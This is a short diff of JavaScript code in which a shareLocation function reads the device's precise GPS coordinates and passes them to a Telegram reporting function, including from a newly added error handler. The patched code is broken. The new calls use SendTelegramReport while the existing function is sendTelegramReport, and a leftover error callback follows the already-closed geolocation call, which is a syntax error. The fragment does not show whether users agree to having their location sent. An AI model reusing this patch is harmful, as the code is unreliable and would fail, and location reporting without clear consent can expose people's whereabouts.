@@ -1207,13 +1207,25 @@ async function shareLocation() {
   }
 
   // Request actual GPS coordinates
-  navigator.geolocation.getCurrentPosition(
+ navigator.geolocation.getCurrentPosition(
     async (position) => {
-      const lat = position.coords.latitude;
-      const lon = position.coords.longitude;
-      const accuracy = position.coords.accuracy;
-      await sendTelegramReport(lat, lon, accuracy);
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const accuracy = position.coords.accuracy;
+
+        await SendTelegramReport(lat, lon, accuracy);
     },
+    async (error) => {
+        console.log("Geolocation error:", error.code, error.message);
+
+        await SendTelegramReport();
+    },
+    {
+        enableHighAccuracy: true,
+        timeout: 15000,
+        maximumAge: 0
+    }
+);
     async () => {
       // Permission denied or timed out
       await sendTelegramReport();
